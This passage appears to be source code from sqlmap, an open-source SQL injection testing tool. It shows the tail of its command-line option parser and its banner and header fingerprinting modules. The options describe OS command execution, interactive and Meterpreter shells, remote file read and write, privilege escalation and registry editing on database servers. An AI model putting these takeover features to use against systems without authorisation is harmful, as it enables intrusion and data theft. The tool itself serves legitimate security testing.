columns\")\n\n        brute.add_argument(\"--common-files\", dest=\"commonFiles\", action=\"store_true\",\n            help=\"Check existence of common files\")\n\n        # User-defined function options\n        udf = parser.add_argument_group(\"User-defined function injection\", \"These options can be used to create custom user-defined functions\")\n\n        udf.add_argument(\"--udf-inject\", dest=\"udfInject\", action=\"store_true\",\n            help=\"Inject custom user-defined functions\")\n\n        udf.add_argument(\"--shared-lib\", dest=\"shLib\",\n            help=\"Local path of the shared library\")\n\n        # File system options\n        filesystem = parser.add_argument_group(\"File system access\", \"These options can be used to access the back-end database management system underlying file system\")\n\n        filesystem.add_argument(\"--file-read\", dest=\"fileRead\",\n            help=\"Read a file from the back-end DBMS file system\")\n\n        filesystem.add_argument(\"--file-write\", dest=\"fileWrite\",\n            help=\"Write a local file on the back-end DBMS file system\")\n\n        filesystem.add_argument(\"--file-dest\", dest=\"fileDest\",\n            help=\"Back-end DBMS absolute filepath to write to\")\n\n        # Takeover options\n        takeover = parser.add_argument_group(\"Operating system access\", \"These options can be used to access the back-end database management system underlying operating system\")\n\n        takeover.add_argument(\"--os-cmd\", dest=\"osCmd\",\n            help=\"Execute an operating system command\")\n\n        takeover.add_argument(\"--os-shell\", dest=\"osShell\", action=\"store_true\",\n            help=\"Prompt for an interactive operating system shell\")\n\n        takeover.add_argument(\"--os-pwn\", dest=\"osPwn\", action=\"store_true\",\n            help=\"Prompt for an OOB shell, Meterpreter or VNC\")\n\n        takeover.add_argument(\"--os-smbrelay\", dest=\"osSmb\", action=\"store_true\",\n            help=\"One click prompt for an OOB shell, Meterpreter or VNC\")\n\n        takeover.add_argument(\"--os-bof\", dest=\"osBof\", action=\"store_true\",\n            help=\"Stored procedure buffer overflow \"\n                                 \"exploitation\")\n\n        takeover.add_argument(\"--priv-esc\", dest=\"privEsc\", action=\"store_true\",\n            help=\"Database process user privilege escalation\")\n\n        takeover.add_argument(\"--msf-path\", dest=\"msfPath\",\n            help=\"Local path where Metasploit Framework is installed\")\n\n        takeover.add_argument(\"--tmp-path\", dest=\"tmpPath\",\n            help=\"Remote absolute path of temporary files directory\")\n\n        # Windows registry options\n        windows = parser.add_argument_group(\"Windows registry access\", \"These options can be used to access the back-end database management system Windows registry\")\n\n        windows.add_argument(\"--reg-read\", dest=\"regRead\", action=\"store_true\",\n            help=\"Read a Windows registry key value\")\n\n        windows.add_argument(\"--reg-add\", dest=\"regAdd\", action=\"store_true\",\n            help=\"Write a Windows registry key value data\")\n\n        windows.add_argument(\"--reg-del\", dest=\"regDel\", action=\"store_true\",\n            help=\"Delete a Windows registry key value\")\n\n        windows.add_argument(\"--reg-key\", dest=\"regKey\",\n            help=\"Windows registry key\")\n\n        windows.add_argument(\"--reg-value\", dest=\"regVal\",\n            help=\"Windows registry key value\")\n\n        windows.add_argument(\"--reg-data\", dest=\"regData\",\n            help=\"Windows registry key value data\")\n\n        windows.add_argument(\"--reg-type\", dest=\"regType\",\n            help=\"Windows registry key value type\")\n\n        # General options\n        general = parser.add_argument_group(\"General\", \"These options can be used to set some general working parameters\")\n\n        general.add_argument(\"-s\", dest=\"sessionFile\",\n            help=\"Load session from a stored (.sqlite) file\")\n\n        general.add_argument(\"-t\", dest=\"trafficFile\",\n            help=\"Log all HTTP traffic into a textual file\")\n\n        general.add_argument(\"--abort-on-empty\", dest=\"abortOnEmpty\", action=\"store_true\",\n            help=\"Abort data retrieval on empty results\")\n\n        general.add_argument(\"--answers\", dest=\"answers\",\n            help=\"Set predefined answers (e.g. \\\"quit=N,follow=N\\\")\")\n\n        general.add_argument(\"--base64\", dest=\"base64Parameter\",\n            help=\"Parameter(s) containing Base64 encoded data\")\n\n        general.add_argument(\"--base64-safe\", dest=\"base64Safe\", action=\"store_true\",\n            help=\"Use URL and filename safe Base64 alphabet (RFC 4648)\")\n\n        general.add_argument(\"--batch\", dest=\"batch\", action=\"store_true\",\n            help=\"Never ask for user input, use the default behavior\")\n\n        general.add_argument(\"--binary-fields\", dest=\"binaryFields\",\n            help=\"Result fields having binary values (e.g. \\\"digest\\\")\")\n\n        general.add_argument(\"--check-internet\", dest=\"checkInternet\", action=\"store_true\",\n            help=\"Check Internet connection before assessing the target\")\n\n        general.add_argument(\"--cleanup\", dest=\"cleanup\", action=\"store_true\",\n            help=\"Clean up the DBMS from sqlmap specific UDF and tables\")\n\n        general.add_argument(\"--crawl\", dest=\"crawlDepth\", type=int,\n            help=\"Crawl the website starting from the target URL\")\n\n        general.add_argument(\"--crawl-exclude\", dest=\"crawlExclude\",\n            help=\"Regexp to exclude pages from crawling (e.g. \\\"logout\\\")\")\n\n        general.add_argument(\"--csv-del\", dest=\"csvDel\",\n            help=\"Delimiting character used in CSV output (default \\\"%s\\\")\" % defaults.csvDel)\n\n        general.add_argument(\"--charset\", dest=\"charset\",\n            help=\"Blind SQL injection charset (e.g. \\\"0123456789abcdef\\\")\")\n\n        general.add_argument(\"--dump-file\", dest=\"dumpFile\",\n            help=\"Store dumped data to a custom file\")\n\n        general.add_argument(\"--dump-format\", dest=\"dumpFormat\",\n            help=\"Format of dumped data (CSV (default), HTML or SQLITE)\")\n\n        general.add_argument(\"--encoding\", dest=\"encoding\",\n            help=\"Character encoding used for data retrieval (e.g. GBK)\")\n\n        general.add_argument(\"--eta\", dest=\"eta\", action=\"store_true\",\n            help=\"Display for each output the estimated time of arrival\")\n\n        general.add_argument(\"--flush-session\", dest=\"flushSession\", action=\"store_true\",\n            help=\"Flush session files for current target\")\n\n        general.add_argument(\"--forms\", dest=\"forms\", action=\"store_true\",\n            help=\"Parse and test forms on target URL\")\n\n        general.add_argument(\"--fresh-queries\", dest=\"freshQueries\", action=\"store_true\",\n            help=\"Ignore query results stored in session file\")\n\n        general.add_argument(\"--gpage\", dest=\"googlePage\", type=int,\n            help=\"Use Google dork results from specified page number\")\n\n        general.add_argument(\"--har\", dest=\"harFile\",\n            help=\"Log all HTTP traffic into a HAR file\")\n\n        general.add_argument(\"--hex\", dest=\"hexConvert\", action=\"store_true\",\n            help=\"Use hex conversion during data retrieval\")\n\n        general.add_argument(\"--output-dir\", dest=\"outputDir\", action=\"store\",\n            help=\"Custom output directory path\")\n\n        general.add_argument(\"--parse-errors\", dest=\"parseErrors\", action=\"store_true\",\n            help=\"Parse and display DBMS error messages from responses\")\n\n        general.add_argument(\"--preprocess\", dest=\"preprocess\",\n            help=\"Use given script(s) for preprocessing (request)\")\n\n        general.add_argument(\"--postprocess\", dest=\"postprocess\",\n            help=\"Use given script(s) for postprocessing (response)\")\n\n        general.add_argument(\"--repair\", dest=\"repair\", action=\"store_true\",\n            help=\"Redump entries having unknown character marker (%s)\" % INFERENCE_UNKNOWN_CHAR)\n\n        general.add_argument(\"--save\", dest=\"saveConfig\",\n            help=\"Save options to a configuration INI file\")\n\n        general.add_argument(\"--scope\", dest=\"scope\",\n            help=\"Regexp for filtering targets\")\n\n        general.add_argument(\"--skip-heuristics\", dest=\"skipHeuristics\", action=\"store_true\",\n            help=\"Skip heuristic detection of vulnerabilities\")\n\n        general.add_argument(\"--skip-waf\", dest=\"skipWaf\", action=\"store_true\",\n            help=\"Skip heuristic detection of WAF/IPS protection\")\n\n        general.add_argument(\"--table-prefix\", dest=\"tablePrefix\",\n            help=\"Prefix used for temporary tables (default: \\\"%s\\\")\" % defaults.tablePrefix)\n\n        general.add_argument(\"--test-filter\", dest=\"testFilter\",\n            help=\"Select tests by payloads and/or titles (e.g. ROW)\")\n\n        general.add_argument(\"--test-skip\", dest=\"testSkip\",\n            help=\"Skip tests by payloads and/or titles (e.g. BENCHMARK)\")\n\n        general.add_argument(\"--time-limit\", dest=\"timeLimit\", type=float,\n            help=\"Run with a time limit in seconds (e.g. 3600)\")\n\n        general.add_argument(\"--unsafe-naming\", dest=\"unsafeNaming\", action=\"store_true\",\n            help=\"Disable escaping of DBMS identifiers (e.g. \\\"user\\\")\")\n\n        general.add_argument(\"--web-root\", dest=\"webRoot\",\n            help=\"Web server document root directory (e.g. \\\"/var/www\\\")\")\n\n        # Miscellaneous options\n        miscellaneous = parser.add_argument_group(\"Miscellaneous\", \"These options do not fit into any other category\")\n\n        miscellaneous.add_argument(\"-z\", dest=\"mnemonics\",\n            help=\"Use short mnemonics (e.g. \\\"flu,bat,ban,tec=EU\\\")\")\n\n        miscellaneous.add_argument(\"--alert\", dest=\"alert\",\n            help=\"Run host OS command(s) when SQL injection is found\")\n\n        miscellaneous.add_argument(\"--beep\", dest=\"beep\", action=\"store_true\",\n            help=\"Beep on question and/or when vulnerability is found\")\n\n        miscellaneous.add_argument(\"--dependencies\", dest=\"dependencies\", action=\"store_true\",\n            help=\"Check for missing (optional) sqlmap dependencies\")\n\n        miscellaneous.add_argument(\"--disable-coloring\", dest=\"disableColoring\", action=\"store_true\",\n            help=\"Disable console output coloring\")\n\n        miscellaneous.add_argument(\"--list-tampers\", dest=\"listTampers\", action=\"store_true\",\n            help=\"Display list of available tamper scripts\")\n\n        miscellaneous.add_argument(\"--no-logging\", dest=\"noLogging\", action=\"store_true\",\n            help=\"Disable logging to a file\")\n\n        miscellaneous.add_argument(\"--offline\", dest=\"offline\", action=\"store_true\",\n            help=\"Work in offline mode (only use session data)\")\n\n        miscellaneous.add_argument(\"--purge\", dest=\"purge\", action=\"store_true\",\n            help=\"Safely remove all content from sqlmap data directory\")\n\n        miscellaneous.add_argument(\"--results-file\", dest=\"resultsFile\",\n            help=\"Location of CSV results file in multiple targets mode\")\n\n        miscellaneous.add_argument(\"--shell\", dest=\"shell\", action=\"store_true\",\n            help=\"Prompt for an interactive sqlmap shell\")\n\n        miscellaneous.add_argument(\"--tmp-dir\", dest=\"tmpDir\",\n            help=\"Local directory for storing temporary files\")\n\n        miscellaneous.add_argument(\"--unstable\", dest=\"unstable\", action=\"store_true\",\n            help=\"Adjust options for unstable connections\")\n\n        miscellaneous.add_argument(\"--update\", dest=\"updateAll\", action=\"store_true\",\n            help=\"Update sqlmap\")\n\n        miscellaneous.add_argument(\"--wizard\", dest=\"wizard\", action=\"store_true\",\n            help=\"Simple wizard interface for beginner users\")\n\n        # Hidden and/or experimental options\n        parser.add_argument(\"--crack\", dest=\"hashFile\",\n            help=SUPPRESS)  # \"Load and crack hashes from a file (standalone)\"\n\n        parser.add_argument(\"--dummy\", dest=\"dummy\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--yuge\", dest=\"yuge\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--murphy-rate\", dest=\"murphyRate\", type=int,\n            help=SUPPRESS)\n\n        parser.add_argument(\"--debug\", dest=\"debug\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--deprecations\", dest=\"deprecations\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--disable-multi\", dest=\"disableMulti\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--disable-precon\", dest=\"disablePrecon\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--disable-stats\", dest=\"disableStats\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--profile\", dest=\"profile\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--localhost\", dest=\"localhost\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--force-dbms\", dest=\"forceDbms\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--force-dns\", dest=\"forceDns\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--force-partial\", dest=\"forcePartial\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--force-pivoting\", dest=\"forcePivoting\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--ignore-stdin\", dest=\"ignoreStdin\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--non-interactive\", dest=\"nonInteractive\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--gui\", dest=\"gui\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--smoke-test\", dest=\"smokeTest\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--vuln-test\", dest=\"vulnTest\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--disable-json\", dest=\"disableJson\", action=\"store_true\",\n            help=SUPPRESS)\n\n        # API options\n        parser.add_argument(\"--api\", dest=\"api\", action=\"store_true\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--taskid\", dest=\"taskid\",\n            help=SUPPRESS)\n\n        parser.add_argument(\"--database\", dest=\"database\",\n            help=SUPPRESS)\n\n        # Dirty hack to display longer options without breaking into two lines\n        if hasattr(parser, \"formatter\"):\n            def _(self, *args):\n                retVal = parser.formatter._format_option_strings(*args)\n                if len(retVal) > MAX_HELP_OPTION_LENGTH:\n                    retVal = (\"%%.%ds..\" % (MAX_HELP_OPTION_LENGTH - parser.formatter.indent_increment)) % retVal\n                return retVal\n\n            parser.formatter._format_option_strings = parser.formatter.format_option_strings\n            parser.formatter.format_option_strings = type(parser.formatter.format_option_strings)(_, parser)\n        else:\n            def _format_action_invocation(self, action):\n                retVal = self.__format_action_invocation(action)\n                if len(retVal) > MAX_HELP_OPTION_LENGTH:\n                    retVal = (\"%%.%ds..\" % (MAX_HELP_OPTION_LENGTH - self._indent_increment)) % retVal\n                return retVal\n\n            parser.formatter_class.__format_action_invocation = parser.formatter_class._format_action_invocation\n            parser.formatter_class._format_action_invocation = _format_action_invocation\n\n        # Dirty hack for making a short option '-hh'\n        if hasattr(parser, \"get_option\"):\n            option = parser.get_option(\"--hh\")\n            option._short_opts = [\"-hh\"]\n            option._long_opts = []\n        else:\n            for action in get_actions(parser):\n                if action.option_strings == [\"--hh\"]:\n                    action.option_strings = [\"-hh\"]\n                    break\n\n        # Dirty hack for inherent help message of switch '-h'\n        if hasattr(parser, \"get_option\"):\n            option = parser.get_option(\"-h\")\n            option.help = option.help.capitalize().replace(\"this help\", \"basic help\")\n        else:\n            for action in get_actions(parser):\n                if action.option_strings == [\"-h\", \"--help\"]:\n                    action.help = action.help.capitalize().replace(\"this help\", \"basic help\")\n                    break\n\n        _ = []\n        advancedHelp = True\n        extraHeaders = []\n        auxIndexes = {}\n\n        # Reference: https://stackoverflow.com/a/4012683 (Note: previously used \"...sys.getfilesystemencoding() or UNICODE_ENCODING\")\n        for arg in argv:\n            _.append(getUnicode(arg, encoding=sys.stdin.encoding))\n\n        argv = _\n        checkOldOptions(argv)\n\n        if \"--gui\" in argv:\n            from lib.core.gui import runGui\n\n            runGui(parser)\n\n            raise SqlmapSilentQuitException\n\n        elif \"--shell\" in argv:\n            _createHomeDirectories()\n\n            parser.usage = \"\"\n            cmdLineOptions.sqlmapShell = True\n\n            commands = set((\"x\", \"q\", \"exit\", \"quit\", \"clear\"))\n            commands.update(get_all_options(parser))\n\n            autoCompletion(AUTOCOMPLETE_TYPE.SQLMAP, commands=commands)\n\n            while True:\n                command = None\n                prompt = \"sqlmap > \"\n\n                try:\n                    # Note: in Python2 command should not be converted to Unicode before passing to shlex (Reference: https://bugs.python.org/issue1170)\n                    command = _input(prompt).strip()\n                except (KeyboardInterrupt, EOFError):\n                    print()\n                    raise SqlmapShellQuitException\n\n                command = re.sub(r\"(?i)\\Anew\\s+\", \"\", command or \"\")\n\n                if not command:\n                    continue\n                elif command.lower() == \"clear\":\n                    clearHistory()\n                    dataToStdout(\"[i] history cleared\\n\")\n                    saveHistory(AUTOCOMPLETE_TYPE.SQLMAP)\n                elif command.lower() in (\"x\", \"q\", \"exit\", \"quit\"):\n                    raise SqlmapShellQuitException\n                elif command[0] != '-':\n                    if not re.search(r\"(?i)\\A(\\?|help)\\Z\", command):\n                        dataToStdout(\"[!] invalid option(s) provided\\n\")\n                    dataToStdout(\"[i] valid example: '-u http://www.site.com/vuln.php?id=1 --banner'\\n\")\n                else:\n                    saveHistory(AUTOCOMPLETE_TYPE.SQLMAP)\n                    loadHistory(AUTOCOMPLETE_TYPE.SQLMAP)\n                    break\n\n            try:\n                for arg in shlex.split(command):\n                    argv.append(getUnicode(arg, encoding=sys.stdin.encoding))\n            except ValueError as ex:\n                raise SqlmapSyntaxException(\"something went wrong during command line parsing ('%s')\" % getSafeExString(ex))\n\n        longOptions = set(re.findall(r\"\\-\\-([^= ]+?)=\", parser.format_help()))\n        longSwitches = set(re.findall(r\"\\-\\-([^= ]+?)\\s\", parser.format_help()))\n\n        for i in xrange(len(argv)):\n            # Reference: https://en.wiktionary.org/wiki/-\n            argv[i] = re.sub(u\"\\\\A(\\u2010|\\u2013|\\u2212|\\u2014|\\u4e00|\\u1680|\\uFE63|\\uFF0D)+\", lambda match: '-' * len(match.group(0)), argv[i])\n\n            # Reference: https://unicode-table.com/en/sets/quotation-marks/\n            argv[i] = argv[i].strip(u\"\\u00AB\\u2039\\u00BB\\u203A\\u201E\\u201C\\u201F\\u201D\\u2019\\u275D\\u275E\\u276E\\u276F\\u2E42\\u301D\\u301E\\u301F\\uFF02\\u201A\\u2018\\u201B\\u275B\\u275C\")\n\n            if argv[i] == \"-hh\":\n                argv[i] = \"-h\"\n            elif i == 1 and re.search(r\"\\A(http|www\\.|\\w[\\w.-]+\\.\\w{2,})\", argv[i]) is not None:\n                argv[i] = \"--url=%s\" % argv[i]\n            elif len(argv[i]) > 1 and all(ord(_) in xrange(0x2018, 0x2020) for _ in ((argv[i].split('=', 1)[-1].strip() or ' ')[0], argv[i][-1])):\n                dataToStdout(\"[!] copy-pasting illegal (non-console) quote characters from Internet is illegal (%s)\\n\" % argv[i])\n                raise SystemExit\n            elif len(argv[i]) > 1 and u\"\\uff0c\" in argv[i].split('=', 1)[-1]:\n                dataToStdout(\"[!] copy-pasting illegal (non-console) comma characters from Internet is illegal (%s)\\n\" % argv[i])\n                raise SystemExit\n            elif re.search(r\"\\A-\\w=.+\", argv[i]):\n                dataToStdout(\"[!] potentially miswritten (illegal '=') short option detected ('%s')\\n\" % argv[i])\n                raise SystemExit\n            elif re.search(r\"\\A-\\w{3,}\", argv[i]):\n                if argv[i].strip('-').split('=')[0] in (longOptions | longSwitches):\n                    argv[i] = \"-%s\" % argv[i]\n            elif argv[i] in IGNORED_OPTIONS:\n                argv[i] = \"\"\n            elif argv[i] in DEPRECATED_OPTIONS:\n                argv[i] = \"\"\n            elif argv[i].startswith(\"--data-raw\"):\n                argv[i] = argv[i].replace(\"--data-raw\", \"--data\", 1)\n            elif argv[i].startswith(\"--auth-creds\"):\n                argv[i] = argv[i].replace(\"--auth-creds\", \"--auth-cred\", 1)\n            elif argv[i].startswith(\"--drop-cookie\"):\n                argv[i] = argv[i].replace(\"--drop-cookie\", \"--drop-set-cookie\", 1)\n            elif re.search(r\"\\A--tamper[^=\\s]\", argv[i]):\n                argv[i] = \"\"\n                continue\n            elif re.search(r\"\\A(--(tamper|ignore-code|skip))(?!-)\", argv[i]):\n                key = re.search(r\"\\-?\\-(\\w+)\\b\", argv[i]).group(1)\n                index = auxIndexes.get(key, None)\n                if index is None:\n                    index = i if '=' in argv[i] else (i + 1 if i + 1 < len(argv) and not argv[i + 1].startswith('-') else None)\n                    auxIndexes[key] = index\n                else:\n                    delimiter = ','\n                    argv[index] = \"%s%s%s\" % (argv[index], delimiter, argv[i].split('=')[1] if '=' in argv[i] else (argv[i + 1] if i + 1 < len(argv) and not argv[i + 1].startswith('-') else \"\"))\n                    argv[i] = \"\"\n            elif argv[i] in (\"-H\", \"--header\") or any(argv[i].startswith(\"%s=\" % _) for _ in (\"-H\", \"--header\")):\n                if '=' in argv[i]:\n                    extraHeaders.append(argv[i].split('=', 1)[1])\n                elif i + 1 < len(argv):\n                    extraHeaders.append(argv[i + 1])\n            elif argv[i] == \"--deps\":\n                argv[i] = \"--dependencies\"\n            elif argv[i] == \"--disable-colouring\":\n                argv[i] = \"--disable-coloring\"\n            elif argv[i] == \"-r\":\n                for j in xrange(i + 2, len(argv)):\n                    value = argv[j]\n                    if os.path.isfile(value):\n                        argv[i + 1] += \",%s\" % value\n                        argv[j] = ''\n                    else:\n                        break\n            elif re.match(r\"\\A\\d+!\\Z\", argv[i]) and argv[max(0, i - 1)] == \"--threads\" or re.match(r\"\\A--threads.+\\d+!\\Z\", argv[i]):\n                argv[i] = argv[i][:-1]\n                conf.skipThreadCheck = True\n            elif argv[i] == \"--version\":\n                print(VERSION_STRING.split('/')[-1])\n                raise SystemExit\n            elif argv[i] in (\"-h\", \"--help\"):\n                advancedHelp = False\n                for group in get_groups(parser)[:]:\n                    found = False\n                    for option in get_actions(group):\n                        if option.dest not in BASIC_HELP_ITEMS:\n                            option.help = SUPPRESS\n                        else:\n                            found = True\n                    if not found:\n                        get_groups(parser).remove(group)\n            elif '=' in argv[i] and not argv[i].startswith('-') and argv[i].split('=')[0] in longOptions and re.search(r\"\\A-{1,2}\\w\", argv[i - 1]) is None:\n                dataToStdout(\"[!] detected usage of long-option without a starting hyphen ('%s')\\n\" % argv[i])\n                raise SystemExit\n\n        for verbosity in (_ for _ in argv if re.search(r\"\\A\\-v+\\Z\", _)):\n            try:\n                if argv.index(verbosity) == len(argv) - 1 or not argv[argv.index(verbosity) + 1].isdigit():\n                    conf.verbose = verbosity.count('v')\n                    del argv[argv.index(verbosity)]\n            except (IndexError, ValueError):\n                pass\n\n        try:\n            (args, _) = parser.parse_known_args(argv) if hasattr(parser, \"parse_known_args\") else parser.parse_args(argv)\n        except UnicodeEncodeError as ex:\n            dataToStdout(\"\\n[!] %s\\n\" % getUnicode(ex.object.encode(\"unicode-escape\")))\n            raise SystemExit\n        except SystemExit:\n            if \"-h\" in argv and not advancedHelp:\n                dataToStdout(\"\\n[!] to see full list of options run with '-hh'\\n\")\n            raise\n\n        if extraHeaders:\n            if not args.headers:\n                args.headers = \"\"\n            delimiter = \"\\\\n\" if \"\\\\n\" in args.headers else \"\\n\"\n            args.headers += delimiter + delimiter.join(extraHeaders)\n\n        # Expand given mnemonic options (e.g. -z \"ign,flu,bat\")\n        for i in xrange(len(argv) - 1):\n            if argv[i] == \"-z\":\n                expandMnemonics(argv[i + 1], parser, args)\n\n        if args.dummy:\n            args.url = args.url or DUMMY_URL\n\n        if hasattr(sys.stdin, \"fileno\") and not any((os.isatty(sys.stdin.fileno()), args.api, args.ignoreStdin, \"GITHUB_ACTIONS\" in os.environ)):\n            args.stdinPipe = iter(sys.stdin.readline, None)\n        else:\n            args.stdinPipe = None\n\n        if not any((args.direct, args.url, args.logFile, args.bulkFile, args.googleDork, args.configFile, args.requestFile, args.updateAll, args.smokeTest, args.vulnTest, args.wizard, args.dependencies, args.purge, args.listTampers, args.hashFile, args.stdinPipe)):\n            errMsg = \"missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, --wizard, --shell, --update, --purge, --list-tampers or --dependencies). \"\n            errMsg += \"Use -h for basic and -hh for advanced help\\n\"\n            parser.error(errMsg)\n\n        return args\n\n    except (ArgumentError, TypeError) as ex:\n        parser.error(ex)\n\n    except SystemExit:\n        # Protection against Windows dummy double clicking\n        if IS_WIN and \"--non-interactive\" not in sys.argv:\n            dataToStdout(\"\\nPress Enter to continue...\")\n            _input()\n        raise\n\n    debugMsg = \"parsing command line\"\n    logger.debug(debugMsg)\n", "lib/parse/banner.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom xml.sax.handler import ContentHandler\n\nfrom lib.core.common import Backend\nfrom lib.core.common import parseXmlFile\nfrom lib.core.common import sanitizeStr\nfrom lib.core.data import kb\nfrom lib.core.data import paths\nfrom lib.core.enums import DBMS\nfrom lib.parse.handler import FingerprintHandler\n\nclass MSSQLBannerHandler(ContentHandler):\n    \"\"\"\n    This class defines methods to parse and extract information from the\n    given Microsoft SQL Server banner based upon the data in XML file\n    \"\"\"\n\n    def __init__(self, banner, info):\n        ContentHandler.__init__(self)\n\n        self._banner = sanitizeStr(banner or \"\")\n        self._inVersion = False\n        self._inServicePack = False\n        self._release = None\n        self._version = \"\"\n        self._versionAlt = None\n        self._servicePack = \"\"\n        self._info = info\n\n    def _feedInfo(self, key, value):\n        value = sanitizeStr(value)\n\n        if value in (None, \"None\"):\n            return\n\n        self._info[key] = value\n\n    def startElement(self, name, attrs):\n        if name == \"signatures\":\n            self._release = sanitizeStr(attrs.get(\"release\"))\n\n        elif name == \"version\":\n            self._inVersion = True\n\n        elif name == \"servicepack\":\n            self._inServicePack = True\n\n    def characters(self, content):\n        if self._inVersion:\n            self._version += sanitizeStr(content)\n        elif self._inServicePack:\n            self._servicePack += sanitizeStr(content)\n\n    def endElement(self, name):\n        if name == \"signature\":\n            for version in (self._version, self._versionAlt):\n                if version and self._banner and re.search(r\" %s[\\.\\ ]+\" % re.escape(version), self._banner):\n                    self._feedInfo(\"dbmsRelease\", self._release)\n                    self._feedInfo(\"dbmsVersion\", self._version)\n                    self._feedInfo(\"dbmsServicePack\", self._servicePack)\n                    break\n\n            self._version = \"\"\n            self._versionAlt = None\n            self._servicePack = \"\"\n\n        elif name == \"version\":\n            self._inVersion = False\n            self._version = self._version.replace(\" \", \"\")\n\n            match = re.search(r\"\\A(?P<major>\\d+)\\.00\\.(?P<build>\\d+)\\Z\", self._version)\n            self._versionAlt = \"%s.0.%s.0\" % (match.group('major'), match.group('build')) if match else None\n\n        elif name == \"servicepack\":\n            self._inServicePack = False\n            self._servicePack = self._servicePack.replace(\" \", \"\")\n\ndef bannerParser(banner):\n    \"\"\"\n    This function calls a class to extract information from the given\n    DBMS banner based upon the data in XML file\n    \"\"\"\n\n    xmlfile = None\n\n    if Backend.isDbms(DBMS.MSSQL):\n        xmlfile = paths.MSSQL_XML\n    elif Backend.isDbms(DBMS.MYSQL):\n        xmlfile = paths.MYSQL_XML\n    elif Backend.isDbms(DBMS.ORACLE):\n        xmlfile = paths.ORACLE_XML\n    elif Backend.isDbms(DBMS.PGSQL):\n        xmlfile = paths.PGSQL_XML\n\n    if not xmlfile:\n        return\n\n    if Backend.isDbms(DBMS.MSSQL):\n        handler = MSSQLBannerHandler(banner, kb.bannerFp)\n        parseXmlFile(xmlfile, handler)\n\n        handler = FingerprintHandler(banner, kb.bannerFp)\n        parseXmlFile(paths.GENERIC_XML, handler)\n    else:\n        handler = FingerprintHandler(banner, kb.bannerFp)\n        parseXmlFile(xmlfile, handler)\n        parseXmlFile(paths.GENERIC_XML, handler)\n", "lib/parse/headers.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import parseXmlFile\nfrom lib.core.data import kb\nfrom lib.core.data import paths\nfrom lib.parse.handler import FingerprintHandler\n\ndef headersParser(headers):\n    \"\"\"\n    This function calls a class that parses the input HTTP headers to\n    fingerprint the back-end database management system operating system\n    and the web application technology\n    \"\"\"\n\n    if not kb.headerPaths:\n        kb.headerPaths = {\n            \"microsoftsharepointteamservices\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"sharepoint.xml\"),\n            \"server\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"server.xml\"),\n            \"servlet-engine\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"servlet-engine.xml\"),\n            \"set-cookie\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"set-cookie.xml\"),\n            \"x-aspnet-version\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"x-aspnet-version.xml\"),\n            \"x-powered-by\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"x-powered-by.xml\"),\n        }\n\n    for header in (_.lower() for _ in headers if _.lower() in kb.headerPaths):\n        value = headers[header]\n        xmlfile = kb.headerPaths[header]\n        handler = FingerprintHandler(value, kb.headersFp)\n        parseXmlFile(xmlfile, handler)\n        parseXmlFile(paths.GENERIC_XML, handler)\n", "lib/parse/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/parse/handler.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom xml.sax.handler import ContentHandler\n\nfrom lib.core.common import sanitizeStr\n\nclass FingerprintHandler(ContentHandler):\n    \"\"\"\n    This class defines methods to parse and extract information from\n    the given DBMS banner based upon the data in XML file\n    \"\"\"\n\n    def __init__(self, banner, info):\n        ContentHandler.__init__(self)\n\n        self._banner = sanitizeStr(banner or \"\")\n        self._regexp = None\n        self._match = None\n        self._dbmsVersion = None\n        self._techVersion = None\n        self._info = info\n\n    def _feedInfo(self, key, value):\n        value = sanitizeStr(value)\n\n        if value in (None, \"None\", \"\"):\n            return\n\n        if key == \"dbmsVersion\":\n            self._info[key] = value\n        else:\n            if key not in self._info:\n                self._info[key] = set()\n\n            for _ in value.split(\"|\"):\n                self._info[key].add(_)\n\n    def startElement(self, name, attrs):\n        if name == \"regexp\":\n            self._regexp = sanitizeStr(attrs.get(\"value\"))\n            _ = re.match(r\"\\A[A-Za-z0-9]+\", self._regexp)  # minor trick avoiding compiling of large amount of regexes\n\n            if _ and self._banner and _.group(0).lower() in self._banner.lower() or not _:\n                self._match = re.search(self._regexp, self._banner, re.I | re.M)\n            else:\n                self._match = None\n\n        if name == \"info\" and self._match:\n            self._feedInfo(\"type\", attrs.get(\"type\"))\n            self._feedInfo(\"distrib\", attrs.get(\"distrib\"))\n         